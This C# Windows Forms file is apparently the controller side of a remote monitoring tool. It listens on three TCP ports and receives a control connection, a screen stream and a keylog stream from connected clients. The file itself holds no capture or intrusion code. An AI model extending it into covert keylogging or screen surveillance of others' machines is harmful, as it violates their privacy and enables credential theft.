using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace Server
{
    public partial class DashBoard : Form
    {
        private TcpClient client;
        private TcpClient screenClient;
        private TcpClient logClient;

        private TcpListener server;
        private TcpListener screenServer;
        private TcpListener logServer;

        private NetworkStream mainStream;
        private NetworkStream screenStream;
        private NetworkStream keylogStream;
        private readonly Thread Listening;

        const string KEY = "CHƯƠNG TRÌNH THEO DÕI TỪ XA";
        public DashBoard()
        {
            CheckForIllegalCrossThreadCalls = false;
            Listening = new Thread(StartListening);
            //Handle = new Thread(HandleClient);
            Listening.IsBackground = true;
            InitializeComponent();
        }


        private void StartListening()
        {
            
            try
            {
                server.Start();
                screenServer.Start();
                logServer.Start();
                while (true)
                {
                    client = server.AcceptTcpClient();

                    screenClient = screenServer.AcceptTcpClient();

                    logClient = logServer.AcceptTcpClient();


                    richTextBox1.Text += client.Client.RemoteEndPoint.ToString() + "\n";
                    Thread Handle = new Thread(HandleClient);
                    Handle.IsBackground = true;
                    Handle.Start();
                }

            }
            catch
            {
                StopListening();
            }
        }
        private void StopListening()
        {
            server.Stop();
            screenServer.Stop();
            logServer.Stop();
            if (Listening.IsAlive)
                Listening.Abort();
            //if (GetImage.IsAlive)
            //    GetImage.Abort();

        }

        private void DashBoard_Load(object sender, EventArgs e)
        {
            server = new TcpListener(IPAddress.Any, 8080);
            screenServer = new TcpListener(IPAddress.Any, 8081);
            logServer = new TcpListener(IPAddress.Any, 8082);
            Listening.Start();
        }



        public void HandleClient()
        {
            Form c = new ControlForm(client, logClient, screenClient);
            c.Name = "Bo";
            c.Show();
            Application.Run();
        }

    }
}
